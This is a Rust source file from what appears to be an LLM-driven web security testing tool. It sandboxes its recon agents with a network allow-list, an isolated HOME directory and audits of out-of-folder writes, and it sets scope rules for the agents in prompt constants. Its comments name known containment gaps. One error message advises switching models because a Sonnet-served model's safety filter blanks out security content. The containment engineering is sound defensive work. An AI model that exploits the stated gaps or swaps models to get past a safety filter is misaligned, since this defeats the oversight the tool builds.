/// prime 전담 HOME — `<sdir>/home` 을 만들고 `.prime` 만 실제 설정으로 연결한다.
/// prime 자식의 HOME 을 여기로 두면 `~/.bashrc`·`~/loot` 같은 work dir 밖 기록이
/// 격리되어 사후 감사(audit_prime_homes)에 걸린다. Unix 전용 — Windows 는 None.
/// /tmp·/var/tmp 절대경로 기록은 막지 못한다(잔여 한계 — 스킬 금지 + 감사 병기).
#[cfg(unix)]
fn setup_prime_home(sdir: &Path) -> Option<PathBuf> {
    let fake = sdir.join("home");
    fs::create_dir_all(&fake).ok()?;
    let real_prime = user_home()?.join(".prime");
    if real_prime.is_dir() {
        let link = fake.join(".prime");
        if fs::symlink_metadata(&link).is_ok() {
            fs::remove_file(&link).ok()?;
        }
        std::os::unix::fs::symlink(&real_prime, &link).ok()?;
    }
    Some(fake)
}
#[cfg(not(unix))]
fn setup_prime_home(_sdir: &Path) -> Option<PathBuf> {
    None
}

/// 전담 HOME 안의 stray 기록 목록 (상대경로, 최대 200개) — `.prime` 링크는 따라가지 않는다.
fn prime_home_strays(home: &Path) -> Vec<String> {
    let mut out = Vec::new();
    let mut stack = vec![home.to_path_buf()];
    while let Some(dir) = stack.pop() {
        if out.len() >= 200 {
            break;
        }
        let Ok(rd) = fs::read_dir(&dir) else { continue };
        for e in rd.flatten() {
            if out.len() >= 200 {
                break;
            }
            let p = e.path();
            let Ok(md) = fs::symlink_metadata(&p) else { continue };
            if md.file_type().is_symlink() {
                continue; // .prime 링크 — 내용 감사 제외
            }
            if md.is_dir() {
                stack.push(p);
                continue;
            }
            if let Ok(rel) = p.strip_prefix(home) {
                out.push(rel.to_string_lossy().to_string());
            }
        }
    }
    out.sort();
    out
}

/// 실행 창 temp 기록 — temp 디렉터리에서 run 시작 이후 수정된 파일 (최대 8).
/// 자사·도구 패턴은 제외한다. 무관한 시스템 파일도 걸릴 수 있어 참고용으로만 보고한다.
fn temp_window_files_in(dir: &Path, start: std::time::SystemTime) -> Vec<String> {
    let mut out = Vec::new();
    let Ok(rd) = fs::read_dir(dir) else { return out };
    for e in rd.flatten() {
        if out.len() >= 8 {
            break;
        }
        let p = e.path();
        let name = p.file_name().and_then(|n| n.to_str()).unwrap_or("");
        if name.is_empty() {
            continue;
        }
        let ours = [
            "redcell-", "rc-", "prime-", ".prime", "kernel-", "pip-", "tmp", ".dotnet",
            "cargo-", "rustc", "npm-", "node-", "vscode-", "playwright", ".com.google",
            "sentry-", "dotnet-", "hsperfdata_", ".org.chromium",
        ];
        if ours.iter().any(|pat| name.starts_with(pat)) {
            continue;
        }
        let Ok(md) = fs::symlink_metadata(&p) else { continue };
        if md.is_dir() {
            continue;
        }
        match md.modified() {
            Ok(mt) if mt > start => out.push(name.to_string()),
            _ => {}
        }
    }
    out.sort();
    out
}

/// /tmp 실행 창 감사 — 참고용 1회 보고 (무관 파일 가능이라 경고가 아닌 참고).
fn audit_temp_window(app: &AppHandle, id: &str, start: std::time::SystemTime) {
    let files = temp_window_files_in(&std::env::temp_dir(), start);
    if files.is_empty() {
        return;
    }
    emit_note(
        app,
        id,
        format!("[sys] 참고: 실행 중 /tmp 기록 {}건({}) — 무관한 시스템 파일일 수 있음.", files.len(), files.join(",")),
        None,
    );
}

/// prime 전담 HOME 사후 감사 — 세션의 전 태그 home 을 훑어 stray 기록을 1회 보고한다.
fn audit_prime_homes(app: &AppHandle, id: &str) {
    let base = root(app).join("prime-sessions").join(id);
    let Ok(rd) = fs::read_dir(&base) else { return };
    let mut hits: Vec<String> = Vec::new();
    for e in rd.flatten() {
        if hits.len() >= 8 {
            break;
        }
        let tagdir = e.path();
        if !tagdir.is_dir() {
            continue;
        }
        let tag = tagdir.file_name().and_then(|n| n.to_str()).unwrap_or("?");
        for s in prime_home_strays(&tagdir.join("home")) {
            hits.push(format!("{tag}/~/{s}"));
            if hits.len() >= 8 {
                break;
            }
        }
    }
    if hits.is_empty() {
        return;
    }
    let shown = hits.iter().take(5).cloned().collect::<Vec<_>>().join(", ");
    let more = if hits.len() > 5 { format!(" 외 {}건", hits.len() - 5) } else { String::new() };
    emit_note(
        app,
        id,
        format!("[sys] 주의: 작업 폴더 밖 기록 {n}건 — 전담 HOME 에 격리되어 보고만 합니다: {shown}{more}.", n = hits.len()),
        None,
    );
}

fn prime_session_has_history(dir: &Path) -> bool {
    fs::read_dir(dir).map(|mut rd| rd.any(|_| true)).unwrap_or(false)
}

/// prime 자율 병합 활성화 — REDCELL_PRIME_AUTONOMOUS=1 일 때만.
/// collector(merge/merge-early) 실행에 --autonomous + 게이트를 붙여 리포트 저장을
/// 자가검증한다. 기본 off (실험적 — 플래그 파싱은 가짜 키 프로브로 확인).
fn prime_autonomous_enabled() -> bool {
    std::env::var("REDCELL_PRIME_AUTONOMOUS").map(|v| v.trim() == "1").unwrap_or(false)
}

/// collector 자가검증 게이트 스크립트 — report.md 존재 + 최소 구조(## 헤더).
/// prime --autonomous-gate 로 넘긴다. 성공 시 스크립트 경로 반환.
fn write_collector_gate(session_dir: &Path) -> Option<PathBuf> {
    let work = session_dir.join("work");
    fs::create_dir_all(&work).ok()?;
    let gate = session_dir.join("gate.sh");
    let body = format!(
        "#!/bin/sh\n# RedCell collector gate — report.md 자가검증.\ntest -s '{}' && grep -q '^## ' '{}'\n",
        work.join("report.md").to_string_lossy(),
        work.join("report.md").to_string_lossy(),
    );
    fs::write(&gate, body).ok()?;
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        fs::set_permissions(&gate, fs::Permissions::from_mode(0o755)).ok()?;
    }
    Some(gate)
}

/// collector 자가검증 저장 지시 — 게이트가 검사할 report.md 저장을 명시한다.
fn autonomous_report_block(workdir: &Path) -> String {
    format!(
        "\n\n## 자가검증 저장 (필수)\n텍스트 출력 전에 리포트 전체를 `{p}` 절대경로에 저장한다\n(edit.run, 상대경로 금지). 하네스 게이트가 이 파일의 존재·구조(## 헤더)를 검사하고,\n미달이면 자동 재시도한다.",
        p = workdir.join("report.md").to_string_lossy(),
    )
}

/// merge 계열 실행인지 — run_tag 는 "{세션id}-{태그}" 형식이다.
fn is_merge_run_tag(run_tag: &str) -> bool {
    run_tag.ends_with("-merge") || run_tag.ends_with("-merge-early")
}

/// prime 스폰 시차(ms) — 5워커 동시 스폰의 커널·LLM 버스트 분산.
/// 커널 부팅 실측 0.9초로 크지 않으나, LLM 레이트리밋·초기 경합 완화에 유효.
/// REDCELL_PRIME_SPAWN_STAGGER_MS (기본 1500, 0이면 해제).
fn prime_spawn_stagger_ms() -> u64 {
    std::env::var("REDCELL_PRIME_SPAWN_STAGGER_MS")
        .ok()
        .and_then(|v| v.trim().parse::<u64>().ok())
        .unwrap_or(1500)
}

/// 워커 스폰 순서 — w1→0, w2→1 … (시차 곱셈용, 파싱 실패 0).
fn worker_spawn_index(worker_id: &str) -> u64 {
    worker_id.strip_prefix('w').and_then(|n| n.parse::<u64>().ok()).map(|n| n.saturating_sub(1)).unwrap_or(0)
}

/// prime-agent 실행 인자 조립 — --mode json --print --skill --session-dir [--continue].
/// 모델/키 규칙은 pi 와 동일 (--provider/--model/--api-key), custom/ollama 는
/// ~/.prime/agent/models.json 에 병합한다 (실측: pi 와 동일 스키마).
fn prime_run_args(
    settings: &Settings,
    provider: &str,
    skill: &Path,
    session_dir: &Path,
    cont: bool,
    instruction: String,
) -> Result<(PathBuf, Vec<String>), String> {
    let bin = prime_agent_path()?;
    // 긴 지시문은 @파일로 넘긴다 (pi 와 동일한 Windows 32K 회피). 태그는 세션 id+태그로
    // 합쳐 동시 실행 세션끼리 파일이 겹치지 않게 한다.
    let run_tag = match (session_dir.parent().and_then(|p| p.file_name()), session_dir.file_name()) {
        (Some(sid), Some(tag)) => format!("{}-{}", sid.to_string_lossy(), tag.to_string_lossy()),
        _ => "prime".to_string(),
    };
    let prompt_arg = spill_prompt_to_file(&run_tag, &instruction).unwrap_or(instruction);
    let mut args: Vec<String> = vec![
        "--mode".into(),
        "json".into(),
        "--print".into(),
        // 시작 네트워크 작업(업데이트 확인 등) 생략 — 부팅 단축 + 텔레메트리/노이즈 차단.
        // 가짜 키 프로브로 모델 경로 동일성 확인 (인증 단계 실패 동일).
        "--offline".into(),
        prompt_arg,
        "--skill".into(),
        skill.to_string_lossy().into_owned(),
        "--session-dir".into(),
        session_dir.to_string_lossy().into_owned(),
    ];
    if cont {
        args.push("--continue".into());
    }
    // 자율 병합 (실험적, env 게이트) — merge 계열에만 게이트를 붙인다.
    if prime_autonomous_enabled() && is_merge_run_tag(&run_tag) {
        if let Some(gate) = write_collector_gate(session_dir) {
            args.push("--autonomous".into());
            args.push("--autonomous-max-turns".into());
            args.push("6".into());
            args.push("--autonomous-gate".into());
            args.push(gate.to_string_lossy().into_owned());
        }
    }
    args.push("--provider".into());
    args.push(provider.to_string());
    let conn = settings.providers.get(provider).cloned().unwrap_or_default();
    if needs_models_json_sync(provider) {
        let mpath = prime_models_json_path()?;
        sync_pi_models_json_at(&mpath, provider, &sync_base_url(provider, &conn), &conn.api_key, &conn.model, &sync_api(provider, &conn))?;
    }
    {
        let m = conn.model.trim().to_string();
        if !m.is_empty() {
            args.push("--model".into());
            args.push(if provider == "custom" || provider == "ollama" { m } else { format!("{provider}/{m}") });
        } else if let Some(d) = PROVIDER_CATALOG.iter().find(|x| x.name == provider) {
            if !d.default_model.is_empty() && provider != "custom" {
                let d = d.default_model.to_string();
                args.push("--model".into());
                args.push(if needs_models_json_sync(provider) { d } else { format!("{provider}/{d}") });
            }
        }
    }
    // `!명령` 키(pi !command)는 models.json 에만 살고 CLI 로 넘기지 않는다 — argv 리터럴은
    // 명령으로 해석되지 않아 인증이 깨진다.
    if !conn.api_key.trim().is_empty() && !conn.api_key.trim_start().starts_with('!') {
        args.push("--api-key".into());
        args.push(conn.api_key.trim().to_string());
    }
    Ok((bin, args))
}

/// prime-agent 도구 안내 v2 — prime 은 단일 `python_repl` + REPL 내 PTC(prime-agent
/// prompt 실측) 구조다. urllib 순차만 가르치던 v1 과 달리 bash() 병렬·REPL 영속·
/// 결과물 파일 규칙까지 가르친다 (진단·워커·collector 공용).
const PRIME_TOOLING: &str = r#"## prime-agent 도구 사용법 (반드시 준수)
- 이 환경의 유일한 툴은 **python_repl**(지속 CPython REPL)이다. bash·파일·검색은
  REPL 안의 함수로 쓴다. `web_fetch` 같은 웹 도구는 없다.
- REPL 상태는 유지된다: 세션·쿠키·변수를 다음 블록에서 재사용하고, 같은 조회 반복 금지.
- 웹 조회 패턴 A — urllib (읽기 전용 GET/HEAD, 타임아웃 10초):
  ```python
  import urllib.request
  req = urllib.request.Request("https://대상/...", headers={"user-agent": "Mozilla/5.0 (RedCell authorized-agent)"}, method="GET")
  res = urllib.request.urlopen(req, timeout=10)
  print(res.status, res.headers.get_content_type())
  print(res.read(400_000).decode("utf-8", "replace"))
  ```
  헤더·쿠키 원문이 필요하면 `res.headers.as_string()` 를 출력한다.
- 웹 조회 패턴 B — bash() 병렬 (여러 경로를 동시에, 타임아웃·실패 격리):
  ```python
  hs = [bash(f"curl -sS -m 10 -o /dev/null -w '%{{http_code}} %{{url_effective}}\\n' 'https://대상/경로{i}'") for i in range(10)]
  rs = [(await h).output for h in hs]  # 전부 띄우고 한꺼번에 기다린다 (순차 await 금지). 결과는 .output 으로 꺼낸다 (핸들 자체에 .strip() 없음 — 실측)
  # 오래 걸리면 handle.kill() 로 정리하고 다음으로. 절대 무한 대기 금지.
  ```
  curl 규칙: `-sS -m 10` 필수, 헤더 필요 시 `-D -`, JSON 은 `| jq` 로 축약.
  출력이 크면 `.tail(50)` 로 자르고, 전체는 파일에만 저장한다.
- 결과물은 `edit.run` 으로 작업 폴더에만 쓴다. 발견·리포트는 지시된 JSON/MD
  파일명 그대로 저장한다 (상대경로 금지 — 지시문의 절대경로를 쓴다).
- POST/PUT/DELETE·브루트포스·파괴적 페이로드·대량 요청 금지. 인가 밖 URL 은 시도조차 금지.
- `websearch.run` 사용 금지 (스코프 밖 검색엔진 접촉). `rlm.spawn` 사용 금지
  (서브에이전트는 호출 단위 감사를 벗어난다) — 모든 작업은 이 세션 REPL 에서.
- URL 은 항상 전체 `http(s)://host/...` 리터럴로 쓴다 (f-string 조립·변수 은닉 금지 —
  하네스 게이트가 감사한다).
"#;

/// 단일 턴 지시문 조립 — pi/prime 공용. prime 은 web_fetch 언급을 python_repl+urllib 로
/// 치환하고 PRIME_TOOLING 을 덧붙인다 (prime-agent 에 web_fetch 이 없음 — 실측).
fn prime_adapt(instruction: String) -> String {
    format!("{}\n{PRIME_TOOLING}", instruction.replace("web_fetch", "python_repl+urllib"))
}

/// 심층 정찰 규율 — REPL 영속을 살리는 단일 블록 원칙 (워커·추적·병합 전용).
/// prime 은 턴마다 fresh kernel 이라 상태가 끊기므로, 한 실행 안에서는 블록을 모아
/// 세션·쿠키·수집 변수를 유지하게 한다. 자유 채팅에는 붙이지 않는다.
const PRIME_DEEP_RECON: &str = r#"## 심층 정찰 규율 (REPL 영속 활용)
- 정찰은 되도록 한 python_repl 블록에 모아라: 세션 객체·쿠키·수집 변수를 블록 안에
  유지하고, 같은 대상·같은 경로의 재조회를 반복하지 마라.
- 여러 경로는 패턴 B(병렬 bash)로 한 번에 — 순차 반복 호출 금지.
- 발견은 텍스트 출력 전에 findings JSON 파일부터 저장한다 (구조화 저장 블록 참조).
"#;

/// 심층용 adapt — 기본 치환 + 도구 안내 + 정찰 규율.
fn prime_adapt_deep(instruction: String) -> String {
    format!("{}\n{PRIME_DEEP_RECON}", prime_adapt(instruction))
}

fn turn_instruction(app: &AppHandle, s: &Session, engine: Engine) -> String {
    let target = target_url(&s.host, s.port);
    let mut goal = s.goal.trim().to_string();
    if goal.is_empty() {
        goal = if s.diag {
            "이 서비스의 보안 진단 리포트를 작성해줘.".to_string()
        } else {
            "아래 사이트를 샅샅이 살펴보고 유용한 정보·정리된 자료를 찾아 정리해줘.".to_string()
        };
    }
    let base = if s.diag {
        // 서비스 진단 모드: 시니어 멘토 스타일 공격 시나리오 리포트.
        let mem = memory_block(app, &s.host);
        let scope = if s.host.trim().is_empty() {
            "실측 없이 설명 기반 진단 — 추정은 [가정] 으로 표시".to_string()
        } else {
            format!(
                "대상 사이트(인가됨): {target}\n{}\n실측 정찰 순서대로 서비스 모델을 세운 뒤 보고서를 작성한다.",
                https_hint_for(&s.host, s.port)
            )
        };
        format!("{DIAG_ROLE}\n\n## 서비스 설명\n\n{goal}\n\n## 진단 경계\n{scope}\n{mem}\n{REPORT_SPEC}")
    } else if s.host.trim().is_empty() {
        // 대상 미지정: 순수 CLI 대화(인가 게이트는 대상 없는 로컬 작업만 통과).
        goal
    } else {
        let tool_line = if engine == Engine::Prime {
            "중요: 웹 조사는 python_repl + urllib 로 수행한다(아래 PRIME_TOOLING 패턴)."
        } else {
            "중요: 웹 조사는 반드시 web_fetch 툴로 수행한다."
        };
        format!(
            "{goal}\n\n대상 사이트(인가됨): {target}\n{}\n인가 목록에 있는 대상이므로 필요한 만큼 자유롭게 조사·탐색하고 결과를 정리해줘.\n{tool_line} 이 컴퓨터의 파일 시스템(bash/read/edit/write)은 조사 대상이 아니라 — 결과물 저장 외에 로컬 머신을 뒤지지 마라.",
            https_hint_for(&s.host, s.port)
        )
    };
    if engine == Engine::Prime && !s.host.trim().is_empty() {
        prime_adapt(base)
    } else {
        base
    }
}

/** prime 모드 실행: node <pi cli.js> --mode json -p "<목표>" — json 이벤트를 패널로 스트리밍. */
fn run_prime(
    app: &AppHandle,
    id: &str,
    s: &Session,
    settings: &Settings,
    redcell: &str,
    provider: &str,
) -> Result<(), String> {
    // 연속 대화: pi 세션 id 를 세션에 보관하고, 같은 id 로 --session-id 를 넘겨
    // CLI 처럼 이전 대화를 이어간다(첫 턴에 생성·저장, 이후 턴은 재사용).
    let s2 = ensure_piq(app, s);
    let piq = s2.piq.clone();
    let mut instruction = turn_instruction(app, &s2, Engine::Pi);
    // 단일 진단 모드에서도 P0 스윕 증거를 주입 (대상이 있을 때만).
    // 스윕 히트 id 는 기계 대조(verify_report_claims)의 유효 P-ID 목록이 된다.
    // 기계 대조 입력 — P-ID → 엔진 심각도(seriousness audit 가 '주장 위험도 ↔ 근거 최대 심각도'
    // 를 비교한다). 맵의 키 집합이 곧 유효 P-ID 목록이다.
    let mut sweep_ids: HashMap<String, String> = HashMap::new();
    if s2.diag && !s2.host.trim().is_empty() {
        let sweep = run_p0_sweep(app, id, &s2.host, s2.port, &s2.auth_cookie, s2.danger_consent);
        sweep_ids = sweep.hits.iter().map(|h| (h.id.clone(), h.severity.clone())).collect();
        instruction.push_str(&p0_evidence_block(&sweep, 6000));
    }

    // RedCell 인가 확장(scope 게이트)을 `-e` 로 **명시 로드**한다 — 전역 설치·트러스트·settings
    // 병합이 없어도 패널에서 항상 게이트가 켜진다(다른 프로젝트의 pi 세션엔 영향 없음).
    let ev3 = json!({ "type": "note", "text": "[sys] 안전장치: pi 의 모든 동작을 점검 대상 목록으로 검사합니다(이번 작업만)." });
    let stamped3 = append_event(app, id, &ev3);
    app.emit("engagement-event", json!({ "sessionId": id, "event": stamped3 })).ok();

    // 동기 프리플라이트 — pi 미설치면 즉시 Err (UI 즉시 안내).
    prime_cli_path(redcell)?;
    {
        let ev = json!({ "type": "note", "text": "[sys] pi 엔진으로 실행합니다.".to_string() });
        let stamped = append_event(app, id, &ev);
        app.emit("engagement-event", json!({ "sessionId": id, "event": stamped })).ok();
    }

    let prep = prepare_engine_run(app, id, Engine::Pi, settings, provider, redcell, &piq, instruction, false)?;
    let (child, pipes) = spawn_prepared(&prep, provider, settings)?;
    app.state::<Procs>().0.lock().unwrap().insert(id.to_string(), child);
    set_status(app, id, "running");
    app.emit("engagement-status", json!({ "sessionId": id, "status": "running" })).ok();

    // 펌프+마감은 백그라운드 스레드에서.
    {
        let app = app.clone();
        let id = id.to_string();
        let prefix = prep.tool_prefix;
        let run_start = std::time::SystemTime::now();
        // 진단 세션만 리포트 표식("final")을 붙인다 — 일반 채팅은 노트로 방출된다.
        // 표식이 붙으면 결과 탭의 등급·필터·내보내기·표지가 정상 동작한다.
        let report_tag: Option<&'static str> = if s2.diag { Some("final") } else { None };
        let cookie = s2.auth_cookie.clone();
        thread::spawn(move || {
            let outcome = pump_and_wait(&app, &id, &id, pipes, None, prefix, None, report_tag);
            finalize_run(&app, &id, &outcome, "pi");
            finalize_single_turn_report(&app, &id, &outcome, &sweep_ids, &cookie);
            audit_temp_window(&app, &id, run_start);
        });
    }
    Ok(())
}

/// 엔진 실행 준비물 — 스폰 전 확정 (인자·스킬·세션dir·게이트 재료).
struct PreparedRun {
    prog: PathBuf,
    args: Vec<String>,
    cwd: PathBuf,
    tool_prefix: &'static str,
    enforce_auth: Option<auth::AuthList>,
    extra_env: Vec<(String, String)>,
}

/// 선행 차단(netfilter) .so 탐색 — REDCELL_NETFILTER_SO > 실행파일 옆 > cwd.
fn netfilter_so_path() -> Option<PathBuf> {
    if let Some(p) = std::env::var_os("REDCELL_NETFILTER_SO").filter(|p| !p.is_empty()) {
        let p = PathBuf::from(p);
        if p.is_file() {
            return Some(p);
        }
        return None; // 명시 지정이 깨졌으면 폴백 탐색하지 않음 (설정 오류 은폐 방지)
    }
    let name = "libredcell_netfilter.so";
    if let Ok(exe) = std::env::current_exe() {
        if let Some(dir) = exe.parent() {
            // 실행파일 옆 (배포 레이아웃 + build.rs 복사본).
            let p = dir.join(name);
            if p.is_file() {
                return Some(p);
            }
            // deps/ 아래 exe(테스트) — 자기 옆 산출물 + 한 단계 위 프로필 디렉터리.
            if dir.file_name().map(|f| f == "deps").unwrap_or(false) {
                if let Some(par) = dir.parent() {
                    let p = par.join(name);
                    if p.is_file() {
                        return Some(p);
                    }
                }
            } else {
                // dev exe 옆에 없으면 deps/ 원본 확인.
                let p = dir.join("deps").join(name);
                if p.is_file() {
                    return Some(p);
                }
            }
        }
    }
    let cwd = PathBuf::from(name);
    if cwd.is_file() {
        return std::fs::canonicalize(cwd).ok();
    }
    None
}

/// 프로바이더 API 호스트 — conn.base_url 우선, 없으면 카탈로그 기본값.
fn provider_api_host(provider: &str, settings: &Settings) -> Option<String> {
    let custom = settings.providers.get(provider).map(|c| c.base_url.trim()).filter(|s| !s.is_empty());
    let base = custom.or_else(|| {
        PROVIDER_CATALOG.iter().find(|p| p.name == provider).map(|p| p.base_url)
    })?;
    redcell_netfilter::extract_host(base)
}

/// ALLOW/DENY 스펙 조립 (순수 함수 — 테스트 용이).
/// allows + 세션 대상 + 프로바이더 호스트, denies 는 제외로 전달한다.
fn build_netfilter_spec(allows: &[String], denies: &[String], extra_hosts: &[String]) -> (String, String) {
    let mut seen = std::collections::HashSet::new();
    let mut allow: Vec<String> = Vec::new();
    for raw in allows.iter().chain(extra_hosts.iter()) {
        let t = raw.trim();
        if t.is_empty() || !seen.insert(t.to_ascii_lowercase()) {
            continue;
        }
        // 파싱 불가한 쓰레기는 여기서 제거 (쓰레기가 전체를 무력화하지 않게).
        if redcell_netfilter::AllowEntry::parse(t).is_some() {
            allow.push(t.to_string());
        }
    }
    let mut deny: Vec<String> = Vec::new();
    for raw in denies {
        let t = raw.trim();
        if !t.is_empty() && redcell_netfilter::AllowEntry::parse(t).is_some() {
            deny.push(t.to_string());
        }
    }
    (allow.join(","), deny.join(","))
}

/// 선행 차단 env 조립 — Linux + .so 존재 시에만 비어 있지 않음.
/// 비어 있으면 호출자가 기존 방어(pi 훅 / 반응형 킬게이트)로 동작한다.
/// .so 프리필터는 호스트 단위만 차단한다 — `ports:` 지시자는 반응형 게이트·
/// 결과측 탐지·기계 대조·스킬 지침에서 집행된다 (원시 소켓의 포트 우회는 잔여 위험).
fn netfilter_extra_env(
    app: &AppHandle,
    id: &str,
    auth: &auth::AuthList,
    provider: &str,
    settings: &Settings,
) -> Vec<(String, String)> {
    if !cfg!(target_os = "linux") {
        return vec![];
    }
    let Some(so) = netfilter_so_path() else {
        return vec![];
    };
    let mut extra: Vec<String> = Vec::new();
    if let Some(s) = read_session(app, id) {
        if let Some(h) = redcell_netfilter::extract_host(&s.host) {
            extra.push(h);
        }
    }
    if let Some(h) = provider_api_host(provider, settings) {
        extra.push(h);
    }
    let (allow, deny) = build_netfilter_spec(&auth.allows, &auth.denies, &extra);
    let log = sessions_dir(app).join(format!("netfilter-{id}.log"));
    let mut env = vec![
        ("LD_PRELOAD".to_string(), so.to_string_lossy().into_owned()),
        ("REDCELL_NETFILTER_ALLOW".to_string(), allow),
        ("REDCELL_NETFILTER_LOG".to_string(), log.to_string_lossy().into_owned()),
    ];
    if !deny.is_empty() {
        env.push(("REDCELL_NETFILTER_DENY".to_string(), deny));
    }
    env
}

/// 선행 차단 상태 노트 (활성/폴백을 실행마다 명시 — 보안 상태는 숨기지 않는다).
fn emit_netfilter_note(app: &AppHandle, id: &str, active: bool) {
    let text = if active {
        "[sys] 연결 보호 켜짐 — 등록되지 않은 주소로의 연결·DNS 는 미리 차단됩니다."
    } else if cfg!(target_os = "linux") {
        "[sys] 연결 보호 부품 없음 — 실행 중 감시로만 동작합니다."
    } else {
        "[sys] 연결 보호는 Linux 전용 — 이 기기에서는 실행 중 감시로 동작합니다."
    };
    let ev = json!({ "type": "note", "text": text });
    let stamped = append_event(app, id, &ev);
    app.emit("engagement-event", json!({ "sessionId": id, "event": stamped })).ok();
}

fn prepare_engine_run(
    app: &AppHandle,
    id: &str,
    engine: Engine,
    settings: &Settings,
    provider: &str,
    redcell: &str,
    run_tag: &str,
    instruction: String,
    quiet: bool, // true = 방어 상태 노트를 생략 (심층 워커·사전 점검 — 실행당 1회만 출력)
) -> Result<PreparedRun, String> {
    match engine {
        Engine::Pi => {
            let (cli, args, cwd) = pi_cli_args(settings, provider, redcell, run_tag, instruction)?;
            let node = first_on_path("node").unwrap_or_else(|| PathBuf::from("node"));
            let mut full = vec![cli.to_string_lossy().into_owned()];
            full.extend(args);
            // 선행 차단 (pi 확장 훅과 이중 방어).
            let auth = auth::load(&resolve_app_auth_path(app));
            let nf = netfilter_extra_env(app, id, &auth, provider, settings);
            if !quiet {
                emit_netfilter_note(app, id, !nf.is_empty());
            }
            Ok(PreparedRun {
                prog: node,
                args: full,
                cwd,
                tool_prefix: "pi-툴",
                enforce_auth: None,
                extra_env: nf,
            })
        }
        Engine::Prime => {
            let auth = auth::load(&resolve_app_auth_path(app));
            let sdir = prime_session_dir(app, id, run_tag);
            let skill = write_scope_skill(&sdir.join("redcell-scope"), &auth.allows, &auth.denies, auth.ports.as_deref())?;
            let cont = prime_session_has_history(&sdir);
            let (bin, args) = prime_run_args(settings, provider, &skill, &sdir, cont, instruction)?;
            if auth.yaml && !quiet {
                let ev = json!({ "type": "note", "text": "[sys] 참고: 고급 설정(YAML) 사용 중 — 실행 중 감시는 동작하지 않고, 시작 전 주소 제한으로만 보호됩니다." });
                let stamped = append_event(app, id, &ev);
                app.emit("engagement-event", json!({ "sessionId": id, "event": stamped })).ok();
            }
            // 선행 차단 (반응형 킬게이트와 이중 방어 — 위반 호출의 첫 실행 자체를 막는다).
            let mut extra_env = vec![("PRIME_AGENT_TELEMETRY".to_string(), "0".to_string())];
            let nf = netfilter_extra_env(app, id, &auth, provider, settings);
            emit_netfilter_note(app, id, !nf.is_empty());
            extra_env.extend(nf);
            // 전담 HOME 격리 — work dir 밖 기록을 분리해 사후 감사한다 (Unix).
            if let Some(fake) = setup_prime_home(&sdir) {
                extra_env.push(("HOME".to_string(), fake.to_string_lossy().into_owned()));
            }
            Ok(PreparedRun {
                prog: bin,
                args,
                cwd: sdir.join("work"),
                tool_prefix: "prime-툴",
                enforce_auth: if auth.yaml { None } else { Some(auth) },
                extra_env,
            })
        }
    }
}

fn spawn_prepared(
    prep: &PreparedRun,
    provider: &str,
    settings: &Settings,
) -> Result<(Child, PiPipes), String> {
    let ee: Vec<(&str, &str)> = prep.extra_env.iter().map(|(k, v)| (k.as_str(), v.as_str())).collect();
    launch_child(&prep.prog, &prep.args, &prep.cwd, provider, settings, &ee, "엔진 실행 실패")
}

/// LLM 연결 사전 점검 — 1턴 핑으로 AI 모델 실동작을 확인한다.
/// 키·모델·API 방언·base URL 문제는 "비정상 종료" 하기 전에 여기서
/// 원인 1건으로 잡아낸다 (정밀 진단 전용).
fn preflight_llm_check(
    app: &AppHandle,
    id: &str,
    engine: Engine,
    settings: &Settings,
    provider: &str,
    redcell: &str,
    piq: &str,
) -> Result<(), String> {
    emit_note(app, id, format!("[sys] AI 모델 연결 확인 중… ({provider})"), None);
    let ping = "연결 확인 핑입니다. 어떤 도구도 사용하지 말고 'pong' 이라고만 답하세요.".to_string();
    // 본 대화 세션을 더럽히지 않게 버림 세션 id 로 실행한다.
    let run_tag = if engine == Engine::Prime { "ping".to_string() } else { format!("{piq}-ping") };
    let prep = prepare_engine_run(app, id, engine, settings, provider, redcell, &run_tag, ping, true)?;
    let (child, pipes) = spawn_prepared(&prep, provider, settings)?;
    let key = format!("{id}#preflight");
    app.state::<Procs>().0.lock().unwrap().insert(key.clone(), child);
    let app2 = app.clone();
    let id2 = id.to_string();
    let key2 = key.clone();
    let prefix = prep.tool_prefix;
    let (tx, rx) = std::sync::mpsc::channel();
    thread::spawn(move || {
        let outcome = pump_and_wait(&app2, &id2, &key2, pipes, None, prefix, None, None);
        let _ = tx.send(outcome);
    });
    let timeout = std::time::Duration::from_secs(90);
    let outcome = match rx.recv_timeout(timeout) {
        Ok(o) => o,
        Err(_) => {
            // 시간 초과 — 자식 트리 전체를 정리하고 실패로 마감.
            if let Some(mut c) = app.state::<Procs>().0.lock().unwrap().remove(&key) {
                kill_engine_child(&mut c);
            }
            return Err(format!(
                "모델 연결 확인(핑) 시간 초과 ({:?}) — '{provider}' 엔드포인트가 응답하지 않습니다. 네트워크·base URL 을 확인하세요.",
                timeout
            ));
        }
    };
    if outcome.failed || outcome.aborted {
        let detail = if outcome.error.is_empty() { "오류 메시지 없음".to_string() } else { outcome.error.clone() };
        let why = classify_ping_failure(settings, provider, &detail);
        return Err(format!(
            "모델 연결 확인(핑) 실패 — provider '{provider}'\n{why}\n설정(⚙) > 프로바이더에서 연결 테스트를 실행해 API 키·모델명·API 방식을 확인하세요."
        ));
    }
    // 빈 성공 — 정상 종료했지만 텍스트가 하나도 없으면(상류 필터의 빈 completion)
    // 워커 5개를 돌려봤자 빈 리포트이므로 여기서 즉시 중단한다.
    if is_empty_success(&outcome) {
        return Err(format!(
            "모델 연결 확인(핑) 실패 — provider '{provider}' 가 빈 응답을 반환했습니다(정상 종료지만 텍스트 없음).\n원인 후보: 모델의 상류 안전 필터(진단 용어·툴 정의 차단), 게이트웨이 무응답.\nlge-aigw 모델이 Sonnet 서빙이면 `{glm}` 로 되돌리세요 — Sonnet 서빙은 보안 진단 콘텐츠를 빈 응답 처리합니다.",
            glm = LGE_AIGW_DEFAULT_MODEL,
        ));
    }
    Ok(())
}

/// pi CLI 버전 — `node <cli.js> --version` 첫 줄 (3초 타임아웃, 실패 시 "미확인").
fn pi_cli_version(settings: &Settings) -> String {
    let fail = || "미확인".to_string();
    let Ok(cli) = prime_cli_path(&settings.redcell_dir) else { return fail(); };
    let Some(node) = first_on_path("node") else { return fail(); };
    let mut probe = Command::new(node);
    probe.arg(&cli).arg("--version").stdout(Stdio::piped()).stderr(Stdio::null());
    hide_window(&mut probe);
    let Ok(mut child) = probe.spawn() else { return fail(); };
    let mut waited = 0;
    loop {
        match child.try_wait() {
            Ok(Some(st)) if st.success() => {
                use std::io::Read;
                let mut out = String::new();
                if let Some(mut o) = child.stdout.take() {
                    let _ = o.read_to_string(&mut out);
                }
                let v = out.lines().next().unwrap_or("").trim().to_string();
                return if v.is_empty() { fail() } else { v };
            }
            Ok(Some(_)) => return fail(),
